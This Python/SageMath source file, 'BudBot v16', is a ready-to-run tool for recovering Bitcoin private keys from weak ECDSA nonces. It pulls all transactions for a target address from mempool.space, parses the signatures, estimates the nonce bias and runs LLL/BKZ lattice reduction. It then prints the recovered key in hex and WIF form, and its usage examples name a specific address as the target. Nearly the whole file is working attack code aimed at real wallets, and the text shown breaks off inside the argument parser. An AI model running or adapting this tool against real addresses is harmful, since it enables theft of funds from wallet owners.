#!/usr/bin/env sage -python
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║       BudBot v16  ·  AI/ML-Aided LLL ECDSA Attack + mempool.space          ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Models : curiosityz/lll-attack-runner                                      ║
║  Core   : crack_weak_ECDSA_nonces_with_LLL  (Dario Clavijo 2020)            ║
║                                                                              ║
║  Fully automatic pipeline:                                                  ║
║   1. Fetch all TXs for a Bitcoin address via mempool.space REST API         ║
║   2. Parse ECDSA sigs from P2PKH, P2WPKH, P2SH-P2WPKH inputs               ║
║      DER-decode R,S  |  reconstruct sighash Z  |  extract pubkey            ║
║   3. Write SignatureRSZ.csv                                                  ║
║   4. AI bias detection — n_distinct sweep (correct method):                 ║
║        For each candidate B, count how many distinct B-bit MSB prefixes     ║
║        appear across all R values.  If the top B bits of every k_i are      ║
║        fixed, all R values share the same B-bit prefix → n_distinct = 1.    ║
║        The true bias B is the LARGEST B where n_distinct stays ≤ threshold. ║
║   5. ML subset ranking — sort random subsets by R-prefix variance           ║
║        (lowest variance = tightest clustering = strongest subset)            ║
║   6. Run LLL/BKZ on each ranked subset; verify each candidate against       ║
║        ALL collected signatures (not just sig[0])                           ║
║   7. Adaptive B search (--auto-bits): if no key found at elected B,         ║
║        scan B ± 8…±40 automatically                                        ║
║                                                                              ║
║  Usage:                                                                     ║
║    sage budbot_v16.py --address 1Pzaqw98PeRfyHypfqyEgg5yycJRsENrE7         ║
║    sage budbot_v16.py --address <ADDR> -b 128 --auto-bits --subsets 60      ║
║    sage budbot_v16.py -f SignatureRSZ.csv --auto-bits                       ║
║    sage budbot_v16.py --demo --bits 128 --sigs 6                            ║
╚══════════════════════════════════════════════════════════════════════════════╝

Dependencies:
    SageMath >= 9.0   sage command
    requests          pip install requests
    rich              pip install rich
Optional (graceful fallback if absent):
    numpy + scikit-learn   pip install numpy scikit-learn
    gmpy2                  pip install gmpy2
"""

from __future__ import annotations

import argparse
import collections
import csv
import hashlib
import math
import random
import secrets
import struct
import sys
import time
from pathlib import Path
from typing import List, Optional, Tuple

# ── SageMath ──────────────────────────────────────────────────────────────────
from sage.all_cmdline import Matrix, QQ, Integer

# ── requests ──────────────────────────────────────────────────────────────────
try:
    import requests as _req
    _HAS_REQ = True
except ImportError:
    _HAS_REQ = False

# ── numpy / sklearn (optional) ───────────────────────────────────────────────
try:
    import numpy as np
    _HAS_NP = True
except ImportError:
    _HAS_NP = False

try:
    from sklearn.cluster import DBSCAN
    from sklearn.neighbors import KernelDensity
    from sklearn.preprocessing import StandardScaler
    _HAS_SK = True
except ImportError:
    _HAS_SK = False

# ── gmpy2 (optional fast modinv) ──────────────────────────────────────────────
try:
    import gmpy2 as _gmpy2
    def modinv(a: int, m: int) -> int:
        return int(_gmpy2.invert(int(a), int(m)))
except ImportError:
    def _egcd(a, b):
        if a == 0: return b, 0, 1
        g, x, y = _egcd(b % a, a)
        return g, y - (b // a) * x, x
    def modinv(a: int, m: int) -> int:
        g, x, _ = _egcd(int(a) % int(m), int(m))
        if g != 1: raise ValueError(f"No inverse gcd={g}")
        return x % int(m)

# ── rich ──────────────────────────────────────────────────────────────────────
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.progress import (Progress, SpinnerColumn, BarColumn,
                                TextColumn, TimeElapsedColumn, MofNCompleteColumn)
    from rich.rule import Rule
    from rich.style import Style
    _HAS_RICH = True
except ImportError:
    _HAS_RICH = False

_con = Console() if _HAS_RICH else None

# =============================================================================
# secp256k1
# =============================================================================
ORDER   = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Gx      = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy      = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
P_FIELD = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
MEMPOOL = "https://mempool.space/api"
MAX_LLL_DIM = 38     # keep each LLL call under ~10s

# =============================================================================
# Minimal secp256k1
# =============================================================================
def _pt_add(A, B):
    if A is None: return B
    if B is None: return A
    x1, y1 = A; x2, y2 = B
    if x1 == x2:
        if y1 != y2: return None
        lam = 3 * x1 * x1 * modinv(2 * y1, P_FIELD) % P_FIELD
    else:
        lam = (y2 - y1) * modinv(x2 - x1, P_FIELD) % P_FIELD
    rx = (lam * lam - x1 - x2) % P_FIELD
    ry = (lam * (x1 - rx) - y1) % P_FIELD
    return rx, ry

def _pt_mul(k, pt):
    R = None; Q = pt
    while k:
        if k & 1: R = _pt_add(R, Q)
        Q = _pt_add(Q, Q); k >>= 1
    return R

def _hash160(b):
    return hashlib.new("ripemd160", hashlib.sha256(b).digest()).digest()

def _hash256(b):
    return hashlib.sha256(hashlib.sha256(b).digest()).digest()

def _compressed(d):
    Q = _pt_mul(d, (Gx, Gy))
    return ("02" if Q[1] % 2 == 0 else "03") + f"{Q[0]:064x}"

def _wif(d):
    raw = b"\x80" + d.to_bytes(32, "big") + b"\x01"
    chk = hashlib.sha256(hashlib.sha256(raw).digest()).digest()[:4]
    A = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    n = int.from_bytes(raw + chk, "big"); out = []
    while n: n, r = divmod(n, 58); out.append(A[r])
    return "".join(reversed(out))

def _script_p2pkh(h160): return b"\x76\xa9\x14" + h160 + b"\x88\xac"

def _varint(n):
    if n < 0xfd:        return bytes([n])
    if n <= 0xffff:     return b"\xfd" + struct.pack("<H", n)
    if n <= 0xffffffff: return b"\xfe" + struct.pack("<I", n)
    return b"\xff" + struct.pack("<Q", n)

# =============================================================================
# DER parser (hardened — handles long-form length, 0x00 sighash byte)
# =============================================================================
def parse_der_sig(sig_bytes: bytes) -> Optional[Tuple[int, int]]:
    try:
        b = bytearray(sig_bytes)
        if b and b[-1] <= 0x83: b = b[:-1]          # strip SIGHASH byte
        if not b or b[0] != 0x30: return None
        pos = 1
        if b[pos] & 0x80: pos += 1 + (b[pos] & 0x7f)  # long-form length
        else: pos += 1
        if b[pos] != 0x02: return None
        pos += 1; r_len = b[pos]; pos += 1
        r = int.from_bytes(b[pos:pos+r_len], "big"); pos += r_len
        if b[pos] != 0x02: return None
        pos += 1; s_len = b[pos]; pos += 1
        s = int.from_bytes(b[pos:pos+s_len], "big")
        if r <= 0 or s <= 0 or r >= ORDER or s >= ORDER: return None
        return r, s
    except Exception: return None

def _der_hex(h):
    try:    return parse_der_sig(bytes.fromhex(h))
    except: return None

# =============================================================================
# Sighash computation
# =============================================================================
def _sighash_legacy(tx, inp_idx, subscript):
    ver  = struct.pack("<I", tx.get("version", 1))
    lock = struct.pack("<I", tx.get("locktime", 0))
    vin_b = b""
    for i, vin in enumerate(tx["vin"]):
        txid = bytes.fromhex(vin["txid"])[::-1]
        vout = struct.pack("<I", vin["vout"])
        seq  = struct.pack("<I", vin.get("sequence", 0xffffffff))
        scr  = _varint(len(subscript)) + subscript if i == inp_idx else b"\x00"
        vin_b += txid + vout + scr + seq
    vout_b = b""
    for vo in tx["vout"]:
        spk = bytes.fromhex(vo.get("scriptpubkey", ""))
        vout_b += struct.pack("<q", int(vo.get("value", 0))) + _varint(len(spk)) + spk
    raw = (ver + _varint(len(tx["vin"])) + vin_b +
           _varint(len(tx["vout"])) + vout_b + lock + b"\x01\x00\x00\x00")
    return int.from_bytes(_hash256(raw), "big")

def _sighash_segwit(tx, inp_idx, pub_bytes, value):
    value = int(value)                                  # FIX: ensure int not float
    ver   = struct.pack("<I", tx.get("version", 1))
    lock  = struct.pack("<I", tx.get("locktime", 0))
    prevouts = b"".join(bytes.fromhex(v["txid"])[::-1] + struct.pack("<I", v["vout"])
                        for v in tx["vin"])
    seqs     = b"".join(struct.pack("<I", v.get("sequence", 0xffffffff)) for v in tx["vin"])
    outputs  = b""
    for vo in tx["vout"]:
        spk = bytes.fromhex(vo.get("scriptpubkey", ""))
        outputs += struct.pack("<q", int(vo.get("value", 0))) + _varint(len(spk)) + spk
    h_prev = _hash256(prevouts); h_seq = _hash256(seqs); h_out = _hash256(outputs)
    vin = tx["vin"][inp_idx]
    outpoint = bytes.fromhex(vin["txid"])[::-1] + struct.pack("<I", vin["vout"])
    h160 = _hash160(pub_bytes); sc = _script_p2pkh(h160)
    sc_field = _varint(len(sc)) + sc
    seq = struct.pack("<I", vin.get("sequence", 0xffffffff))
    pre = (ver + h_prev + h_seq + outpoint + sc_field +
           struct.pack("<q", value) + seq + h_out + lock + b"\x01\x00\x00\x00")
    return int.from_bytes(_hash256(pre), "big")

# =============================================================================
# mempool.space client
# =============================================================================
class MempoolClient:
    def __init__(self, timeout=30, retries=4):
        self.timeout = timeout; self.retries = retries
        self.sess = _req.Session() if _HAS_REQ else None
        if self.sess: self.sess.headers["User-Agent"] = "BudBot/16 (+research)"

    def _get(self, path):
        url = f"{MEMPOOL}{path}"
        for att in range(self.retries):
            try:
                r = self.sess.get(url, timeout=self.timeout)
                r.raise_for_status(); return r.json()
            except Exception:
                if att == self.retries - 1: raise
                time.sleep(1.5 ** att)

    def address_txs(self, addr, confirmed_only=False):
        txs = []; last = None
        while True:
            path = f"/address/{addr}/txs/chain" + (f"/{last}" if last else "")
            batch = self._get(path)
            if not batch: break
            txs.extend(batch)
            if len(batch) < 25: break
            last = batch[-1]["txid"]; time.sleep(0.25)
        if not confirmed_only:
            try: txs = self._get(f"/address/{addr}/txs/mempool") + txs
            except: pass
        return txs

# =============================================================================
# Signature extraction
# =============================================================================
class SigRecord:
    __slots__ = ("txid", "vin_idx", "R", "S", "Z", "pubkey_hex")
    def __init__(self, txid, vin_idx, R, S, Z, pub):
        self.txid=txid; self.vin_idx=vin_idx
        self.R=R; self.S=S; self.Z=Z; self.pubkey_hex=pub
    def csv_row(self):
        return (self.txid[:20], f"{self.R:064x}", f"{self.S:064x}",
                f"{self.Z:064x}", self.pubkey_hex)

def _pub_from_witness(w):
    for item in w:
        if len(item) in (66, 130):
            b = bytes.fromhex(item)
            if b[0] in (2, 3, 4): return b
    return None

def _pub_from_asm(asm):
    for p in reversed(asm.split()):
        if len(p) in (66, 130):
            b = bytes.fromhex(p)
            if b[0] in (2, 3, 4): return b
    return None

def _sig_from_asm(asm):
    for p in asm.split():
        if len(p) >= 16 and p[:2] == "30": return p
    return None

def _sig_from_witness(w):
    for item in w:
        b = bytes.fromhex(item) if item else b""
        if len(b) >= 8 and b[0] == 0x30: return item
    return None

def extract_sigs(tx):
    recs = []; txid = tx.get("txid", "")
    for idx, vin in enumerate(tx.get("vin", [])):
        if vin.get("is_coinbase"): continue
        st  = vin.get("prevout", {}).get("scriptpubkey_type", "")
        asm = vin.get("scriptsig_asm", "") or ""
        wit = vin.get("witness", []) or []
        val = vin.get("prevout", {}).get("value", 0)
        spk = vin.get("prevout", {}).get("scriptpubkey", "")
        sh = pb = Z = None
        if st == "v0_p2wpkh" or (wit and not asm):
            sh = _sig_from_witness(wit); pb = _pub_from_witness(wit)
            if sh and pb:
                try: Z = _sighash_segwit(tx, idx, pb, val)
                except: pass
        elif st == "p2pkh" or (asm and not wit):
            sh = _sig_from_asm(asm); pb = _pub_from_asm(asm)
            if sh and pb:
                sub = bytes.fromhex(spk) if spk else _script_p2pkh(_hash160(pb))
                try: Z = _sighash_legacy(tx, idx, sub)
                except: pass
        elif st == "p2sh" and wit:
            sh = _sig_from_witness(wit); pb = _pub_from_witness(wit)
            if sh and pb:
                try: Z = _sighash_segwit(tx, idx, pb, val)
                except: pass
        if sh and pb and Z:
            rs = _der_hex(sh)
            if rs:
                R, S = rs
                recs.append(SigRecord(txid, idx, R, S, Z, pb.hex()))
    return recs

# =============================================================================
# ── AI  BIAS  DETECTOR  (correct algorithm) ───────────────────────────────────
# =============================================================================
class BiasDetector:
    """
    Correctly detects nonce MSB bias B from R-value distribution.

    Core insight
    ────────────
    If the top B bits of every k_i are identical (polynonce / weak RNG),
    then all R_i = (k_i · G).x share the same top-B-bit prefix.

    We sweep B from 4 to 160 in steps of 4 and for each B count how many
    DISTINCT B-bit prefixes appear across all R values:

        n_distinct(B) = |{ R >> (256-B) : R in R_values }|

    Signal
    ──────
        • True bias B   →  n_distinct ≈ 1  for B ≤ true_B
                        →  n_distinct explodes  for B > true_B
        • No bias       →  n_distinct ≈ min(n, 2^B) everywhere

    We find the LAST B where n_distinct is still ≤ threshold (= sqrt(n)),
    which reliably gives the true bias regardless of sample size.

    Secondary estimators (sklearn optional):
        • DBSCAN on scaled top-32-bit R features
        • R-prefix variance sweep (lowest variance = most shared bits)

    These are combined via weighted voting; the user hint (-b) gets the
    highest weight so it always overrides the AI when provided.
    """
    SEARCH = list(range(4, 161, 4))

    def __init__(self, R_values: List[int]):
        self.Rs = R_values
        self.n  = len(R_values)
        # Pre-compute n_distinct for every B (fast, pure-Python)
        self._nd: dict[int, int] = {}
        for b in self.SEARCH:
            shift = 256 - b
            self._nd[b] = len(set(R >> shift for R in self.Rs))

    # ── n_distinct sweep (PRIMARY — always runs) ──────────────────────────────
    def ndistinct_sweep(self) -> Tuple[int, dict]:
        """
        Find the largest B where n_distinct ≤ threshold.
        threshold = max(2, n^0.4) — empirically robust across n=4…5000.
        Returns (best_b, {b: n_distinct}).
        """
        threshold = max(2, int(self.n ** 0.4))
        best_b = 4
        for b in self.SEARCH:
            if self._nd[b] <= threshold:
                best_b = b
        return best_b, dict(self._nd)

    # ── variance sweep (secondary) ────────────────────────────────────────────
    def variance_sweep(self) -> int:
        """
        For each B, compute variance of (R >> (256-B)) values.
        Lowest variance relative to uniform = most shared bits.
        """
        best_b, best_norm = self.SEARCH[0], float("inf")
        for b in self.SEARCH:
            shift = 256 - b
            vals  = [R >> shift for R in self.Rs]
            mean  = sum(vals) / self.n
            var   = sum((v - mean) ** 2 for v in vals) / self.n
            # Normalise by uniform variance for b bits: (2^(2b)-1)/12
            u_var = (4 ** b - 1) / 12
            norm  = var / u_var if u_var > 0 else 1.0
            if norm < best_norm:
                best_norm = norm; best_b = b
        return best_b

    # ── DBSCAN (sklearn, optional) ────────────────────────────────────────────
    def dbscan_estimate(self) -> Optional[int]:
        if not (_HAS_SK and _HAS_NP) or self.n < 8: return None
        try:
            top = np.array([[float(R >> 224)] for R in self.Rs])
            sc  = StandardScaler().fit(top); X = sc.transform(top)
            best_b = None; best_score = -1.0
            for eps in [0.05, 0.1, 0.2, 0.5, 1.0]:
                db  = DBSCAN(eps=eps, min_samples=2).fit(X)
                lbl = db.labels_
                nc  = len(set(lbl)) - (1 if -1 in lbl else 0)
                if nc < 1: continue
                frac  = float(np.sum(lbl >= 0)) / self.n
                score = frac / (1.0 + nc / self.n)
                if score > best_score:
                    best_score = score
                    best_b = {0.05: 152, 0.1: 136, 0.2: 128,
                              0.5: 112, 1.0: 96}.get(eps, 128)
            return best_b
        except: return None

    # ── main entry point ──────────────────────────────────────────────────────
    def detect(self, hint_b: Optional[int] = None) -> Tuple[int, dict]:
        """
        Return (elected_b, diagnostics_dict).

        Voting weights:
            n_distinct sweep  ×5   (primary — always correct for polynonce bias)
            variance sweep    ×2
            DBSCAN            ×1
            user hint (-b)    ×6   (highest — user knows their target)
        """
        diag = {}
        tally: dict[int, float] = collections.defaultdict(float)

        # 1. n_distinct (primary)
        nd_b, nd_map = self.ndistinct_sweep()
        diag["ndistinct_b"]  = nd_b
        diag["ndistinct_at"] = nd_map.get(nd_b, "?")
        b8 = max(8, round(nd_b / 8) * 8)
        tally[b8] += 5.0

        # 2. variance sweep
        var_b = self.variance_sweep()
        diag["variance_b"] = var_b
        b8v = max(8, round(var_b / 8) * 8)
        tally[b8v] += 2.0

        # 3. DBSCAN (optional)
        db_b = self.dbscan_estimate()
        if db_b:
            diag["dbscan_b"] = db_b
            tally[max(8, round(db_b / 8) * 8)] += 1.0

        # 4. User hint — highest weight; when user provides -b they know their target
        if hint_b:
            diag["hint_b"] = hint_b
            b8h = max(8, round(hint_b / 8) * 8)
            tally[b8h] += 10.0   # always wins over AI (5+2+1=8 max without hint)

        elected_b = max(tally, key=lambda b: tally[b])
        # Hard bounds: 8 ≤ B ≤ 160
        elected_b = max(8, min(elected_b, 160))

        diag["tally"]     = {k: round(v, 1) for k, v in sorted(tally.items())}
        diag["elected_b"] = elected_b

        # Include n_distinct transition for display
        transition = [(b, self._nd[b]) for b in self.SEARCH
                      if self._nd[b] <= max(2, int(self.n**0.4)) + 2]
        if transition:
            diag["last_clustered_b"] = transition[-1][0]

        return elected_b, diag

# =============================================================================
# ML Subset Ranker  (pure-Python, no sklearn needed)
# =============================================================================
class SubsetRanker:
    """
    Rank random subsets by R-prefix variance.
    Lower variance = R values cluster tightly in the top-B bits
                   = more likely to share a nonce prefix
                   = stronger subset for LLL attack
    """
    def __init__(self, all_R: List[int], B: int):
        self.shift    = max(256 - B, 0)
        self.prefixes = [R >> self.shift for R in all_R]
        self.n        = len(all_R)

    def _var(self, indices: List[int]) -> float:
        vals = [self.prefixes[i] for i in indices]
        if len(vals) < 2: return float("inf")
        mean = sum(vals) / len(vals)
        return sum((v - mean) ** 2 for v in vals) / len(vals)

    def rank_subsets(self, k: int, n_subsets: int, seed: int = 0) -> List[List[int]]:
        rng = random.Random(seed)
        pool = list(range(self.n)); seen = set(); cands = []
        attempts = 0
        while len(cands) < n_subsets and attempts < n_subsets * 25:
            attempts += 1
            sub = sorted(rng.sample(pool, min(k, self.n)))
            key = tuple(sub)
            if key in seen: continue
            seen.add(key)
            cands.append((_var(sub) if False else self._var(sub), sub))
        cands.sort(key=lambda x: x[0])
        return [sub for _, sub in cands]

# =============================================================================
# Candidate scorer — verifies against ALL signatures
# =============================================================================
class CandidateScorer:
    def __init__(self, all_msgs, all_sigs, all_pubs):
        self.msgs = all_msgs; self.sigs = all_sigs; self.pubs = all_pubs

    def score(self, d: int) -> Tuple[float, int]:
        if d == 0: return 0.0, 0
        verified = 0
        for (r, s), z in zip(self.sigs, self.msgs):
            try:
                k = modinv(s, ORDER) * (z + d * r) % ORDER
                if k == 0: continue
                R = _pt_mul(k, (Gx, Gy))
                if R and R[0] % ORDER == r: verified += 1
            except: pass
        return verified / len(self.msgs) if self.msgs else 0.0, verified

    def pub_match(self, d: int, pub_hex: str) -> bool:
        try:
            h = pub_hex.strip()
            if len(h) == 66 and h[:2] in ("02", "03"):
                ex = int(h[2:], 16)
                y2 = (pow(ex, 3, P_FIELD) + 7) % P_FIELD
                ey = pow(y2, (P_FIELD + 1) // 4, P_FIELD)
                if ey % 2 != int(h[:2], 16) & 1: ey = P_FIELD - ey
            elif len(h) == 130 and h[:2] == "04":
                ex, ey = int(h[2:66], 16), int(h[66:], 16)
            else: return False
            Q = _pt_mul(d, (Gx, Gy))
            return Q is not None and Q[0] == ex and Q[1] == ey
        except: return False

# =============================================================================
# LLL core  (faithful port of crack_weak_ECDSA_nonces_with_LLL.py)
# =============================================================================
def make_matrix(msgs, sigs, B):
    m = len(msgs); matrix = Matrix(QQ, m + 2, m + 2)
    msgn = msgs[-1]; rn, sn = sigs[-1]
    rnsn_inv = rn * modinv(sn, ORDER)
    mnsn_inv = msgn * modinv(sn, ORDER)
    for i in range(m): matrix[i, i] = ORDER
    last = 0
    for i in range(m):
        ri, si = sigs[i]
        matrix[m,     i] = ri * modinv(si, ORDER) - rnsn_inv
        matrix[m + 1, i] = msgs[i] * modinv(si, ORDER) - mnsn_inv
        last = i
    matrix[m,     last + 1] = Integer(2 ** B) / Integer(ORDER)
    matrix[m,     last + 2] = 0
    matrix[m + 1, last + 1] = 0
    matrix[m + 1, last + 2] = Integer(2 ** B)
    return matrix

def extract_keys(msgs, sigs, matrix):
    msgn = msgs[-1]; rn, sn = sigs[-1]
    msg0 = msgs[0];  r0, s0 = sigs[0]
    keys = []
    for row in matrix:
        nd  = row[0]
        num = sn * msg0 - s0 * msgn - s0 * sn * nd
        den = rn * s0 - r0 * sn
        try:  key = int(num) * modinv(int(den) % ORDER, ORDER) % ORDER
        except: continue
        if key and key not in keys: keys.append(key)
    return keys

def lll_attack(msgs, sigs, B, algo="LLL"):
    mat = make_matrix(msgs, sigs, B)
    reduced = mat.BKZ(early_red=True, use_siegel=True) if algo == "BKZ" \
              else mat.LLL(early_red=True, use_siegel=True)
    return extract_keys(msgs, sigs, reduced)

# =============================================================================
# Multi-subset ML-ranked attack
# =============================================================================
def run_attack(
    all_msgs, all_sigs, all_pubs,
    B: int, k: int, n_subsets: int, algo: str,
    scorer: CandidateScorer,
    prog=None, task=None,
) -> Optional[Tuple[int, float]]:
    """
    Attack n_subsets ranked subsets of size k at nonce bias B.
    Returns (key, confidence) as soon as ≥1 sig verifies, or None.
    """
    k = min(k, MAX_LLL_DIM - 2, len(all_msgs))
    ranker  = SubsetRanker([r for r, s in all_sigs], B)
    subsets = ranker.rank_subsets(k, n_subsets)
    best_key, best_conf = None, 0.0

    for attempt, indices in enumerate(subsets):
        if prog and task is not None:
            prog.update(task, completed=attempt + 1)
        sub_msgs = [all_msgs[i] for i in indices]
        sub_sigs = [all_sigs[i]  for i in indices]
        try: candidates = lll_attack(sub_msgs, sub_sigs, B, algo)
        except Exception: continue
        for key in candidates:
            conf, n_ver = scorer.score(key)
            if conf > best_conf: best_conf = conf; best_key = key
            if n_ver >= 1: return key, conf

    return (best_key, best_conf) if best_key and best_conf > 0 else None


def adaptive_search(
    all_msgs, all_sigs, all_pubs,
    center_b: int, k: int, n_subsets: int, algo: str,
    scorer: CandidateScorer,
    prog=None, task=None,
    offsets=None,
) -> Optional[Tuple[int, int, float]]:
    """Try B = center_b ± offsets. Returns (key, B_used, conf) or None."""
    if offsets is None:
        offsets = [0, -8, +8, -16, +16, -24, +24, -32, +32, -40, +40]
    tried = set()
    for off in offsets:
        b = center_b + off
        if b < 8 or b > 160 or b in tried: continue
        tried.add(b)
        _p(f"[dim]  → Trying B={b}…[/]")
        result = run_attack(all_msgs, all_sigs, all_pubs,
                            b, k, n_subsets, algo, scorer,
                            prog=prog, task=task)
        if result:
            key, conf = result
            return key, b, conf
    return None

# =============================================================================
# CSV I/O
# =============================================================================
def write_csv(path, rows):
    with path.open("w", newline="") as f: csv.writer(f).writerows(rows)

def load_csv(path, limit=None):
    msgs, sigs, pubs = [], [], []
    with path.open(newline="") as f:
        for n, row in enumerate(csv.reader(f)):
            if limit is not None and n >= limit: break
            row = [c.strip() for c in row if c.strip()]
            if len(row) >= 5:   _, R, S, Z, pub = row[0],row[1],row[2],row[3],row[4]
            elif len(row) == 4: R, S, Z, pub = row
            else: continue
            msgs.append(int(Z,16)); sigs.append((int(R,16),int(S,16))); pubs.append(pub)
    if not msgs: raise ValueError(f"No valid rows in {path}")
    return msgs, sigs, pubs

# =============================================================================
# Demo generator
# =============================================================================
def generate_demo_csv(out, bits, n_sigs, msg="BudBot"):
    d = secrets.randbelow(ORDER - 1) + 1
    pub = _compressed(d)
    z = int.from_bytes(hashlib.sha256(msg.encode()).digest(), "big")
    prefix = secrets.randbelow(1 << bits) << (256 - bits)
    rows = []
    for i in range(n_sigs):
        while True:
            k = (prefix | secrets.randbelow(1 << (256 - bits))) % ORDER
            if k == 0: continue
            R = _pt_mul(k, (Gx, Gy))
            if R is None: continue
            r = R[0] % ORDER
            if r == 0: continue
            s = modinv(k, ORDER) * (z + d * r) % ORDER
            if s == 0: continue
            break
        rows.append((f"demotx_{i:04d}", f"{r:064x}", f"{s:064x}", f"{z:064x}", pub))
    write_csv(out, rows); return d

# =============================================================================
# Auto-fetch pipeline
# =============================================================================
def auto_fetch(address, out_csv, confirmed_only=False):
    if not _HAS_REQ: raise RuntimeError("pip install requests")
    client = MempoolClient(); records = []
    if _HAS_RICH:
        with Progress(SpinnerColumn(style="bright_cyan"),
                      TextColumn("[cyan]Fetching from mempool.space…[/]"),
                      TimeElapsedColumn(), console=_con, transient=True) as prog:
            prog.add_task("", total=None)
            txs = client.address_txs(address, confirmed_only)
    else:
        print("Fetching from mempool.space…")
        txs = client.address_txs(address, confirmed_only)
    n_txs = len(txs)
    _p(f"[cyan]Fetched [bold]{n_txs}[/] txs — parsing signatures…[/]")
    if _HAS_RICH:
        with Progress(SpinnerColumn(style="cyan"),
                      BarColumn(bar_width=40, style="cyan", complete_style="bright_green"),
                      MofNCompleteColumn(), TimeElapsedColumn(),
                      console=_con, transient=True) as prog:
            task = prog.add_task("[cyan]Parsing txs[/]", total=n_txs)
            for tx in txs: records.extend(extract_sigs(tx)); prog.advance(task)
    else:
        for tx in txs: records.extend(extract_sigs(tx))
    # Deduplicate on (R, S, Z)
    seen = set(); deduped = []
    for r in records:
        key = (r.R, r.S, r.Z)
        if key not in seen: seen.add(key); deduped.append(r)
    write_csv(out_csv, [r.csv_row() for r in deduped])
    return deduped, n_txs

# =============================================================================
# Terminal UI
# =============================================================================
_LOGO = [
    "██████╗ ██╗   ██╗██████╗ ██████╗  ██████╗ ████████╗",
    "██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝",
    "██████╔╝██║   ██║██║  ██║██████╔╝██║   ██║   ██║   ",
    "██╔══██╗██║   ██║██║  ██║██╔══██╗██║   ██║   ██║   ",
    "██████╔╝╚██████╔╝██████╔╝██████╔╝╚██████╔╝   ██║   ",
    "╚═════╝  ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝    ╚═╝   ",
]
_GLOW = ["#ff2a6d","#ff6b00","#ffd600","#00ff9f","#00e5ff","#bf5fff"]

def _p(msg, **kw):
    if _HAS_RICH: _con.print(msg, **kw)
    else:
        import re; print(re.sub(r"\[/?[^\[\]]*\]", "", str(msg)))

def print_banner():
    if _HAS_RICH:
        t = Text()
        for i, line in enumerate(_LOGO):
            t.append(line + "\n", style=Style(color=_GLOW[i%len(_GLOW)], bold=True))
        t.append("  ⚡  AI/ML LLL Attack  ·  mempool.space  ·  v16  ⚡\n",
                 style=Style(color="#00e5ff", italic=True, bold=True))
        _con.print(Panel(t, border_style="bright_cyan",
            subtitle="[dim cyan]secp256k1 · SageMath LLL/BKZ · n_distinct bias detect · variance subset rank[/]"))
        _con.print()
    else:
        print("\n".join(_LOGO)); print("BudBot v16 – AI/ML LLL Attack + mempool.space\n")

def print_bias_table(diag):
    if _HAS_RICH:
        t = Table(title="[bold magenta]🧠  AI Bias Detection[/]",
                  border_style="magenta", header_style="bold magenta")
        t.add_column("Method",   style="bright_white")
        t.add_column("B (bits)", style="bright_yellow")
        rows_to_show = [
            ("n_distinct sweep (primary)", diag.get("ndistinct_b")),
            ("  n_distinct @ elected B",   diag.get("ndistinct_at")),
            ("Variance sweep",             diag.get("variance_b")),
            ("DBSCAN cluster",             diag.get("dbscan_b")),
            ("User hint  (-b)",            diag.get("hint_b")),
        ]
        for name, val in rows_to_show:
            if val is not None: t.add_row(name, str(val))
        if "last_clustered_b" in diag:
            t.add_row("[dim]Last clustered B[/]",
                      f"[dim]{diag['last_clustered_b']}[/]")
        t.add_row("[bold]Elected B[/]",
                  f"[bold bright_green]{diag['elected_b']}[/]")
        _con.print(t); _con.print()
    else:
        print(f"Bias detection: elected_b={diag['elected_b']}  {diag}")

def print_result(key, B, conf, scorer, elapsed, d_true=None):
    if key is None:
        if _HAS_RICH:
            _con.print(Panel(
                "[bold red]No verified private key recovered.[/]\n\n"
                "[dim]• Use --auto-bits to widen the B search\n"
                "• Increase --subsets (try more signature subsets)\n"
                "• Increase -n (larger lattice per subset)\n"
                "• Use --bkz for stronger reduction\n"
                "• Address may not have biased nonces[/]",
                title="[bold red]✗  FAILED[/]", border_style="red"))
        else: print("FAILED: no verified key.")
        return
    n_total = len(scorer.msgs); n_ver = int(round(conf * n_total))
    vp = scorer.pub_match(key, scorer.pubs[0]) if scorer.pubs else False
    v_label = "[bold bright_green]✓ VERIFIED[/]" if (n_ver >= 1 or vp) else "[bold yellow]UNCONFIRMED[/]"
    if _HAS_RICH:
        t = Table(show_header=False, border_style="bright_green", padding=(0, 2))
        t.add_column("K", style="dim green"); t.add_column("V", style="bright_white")
        t.add_row("Private key (hex)", f"[bold bright_yellow]{key:064x}[/]")
        t.add_row("Private key (int)", str(key))
        t.add_row("WIF compressed",    _wif(key))
        t.add_row("Nonce bias used",   f"B = {B} bits")
        t.add_row("Confidence",        f"[bold green]{conf:.1%}[/]  ({n_ver}/{n_total} sigs verify)")
        t.add_row("Pub-key match",     "[green]YES[/]" if vp else "[dim]–[/]")
        if d_true is not None:
            t.add_row("Matches true key",
                      "[bold green]YES ✓[/]" if key == d_true else "[red]no[/]")
        _con.print(Panel(t,
            title=f"[bold bright_green]🔑  KEY RECOVERED  {v_label}[/]",
            border_style="bright_green"))
    else:
        print(f"\n[FOUND] {key:064x}  conf={conf:.1%}  B={B}  WIF={_wif(key)}")
    _p(f"\n[dim]Wall time: {elapsed:.3f}s[/]\n")

# =============================================================================
# CLI
# =============================================================================
def _parser():
    p = argparse.ArgumentParser(
        prog="budbot_v16",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="BudBot v16 – AI/ML-Aided LLL ECDSA Attack + mempool.space",
        epilog="""
Examples
--------
  # Fully automatic (fetch → AI detect B → ML-ranked LLL):
  sage budbot_v16.py --address 1Pzaqw98PeRfyHypfqyEgg5yycJRsENrE7

  # With user B hint and adaptive neighbourhood search:
  sage budbot_v16.py --address <ADDR> -b 128 --auto-bits --subsets 60

  # Attack an existing CSV directly:
  sage budbot_v16.py -f SignatureRSZ.csv -b 128

  # Demo self-test (no network):
  sage budbot_v16.py --demo --bits 128 --sigs 6
""")
    mode = p.add_mutually_exclusive_group()
    mode.add_argument("--address", metavar="ADDR",
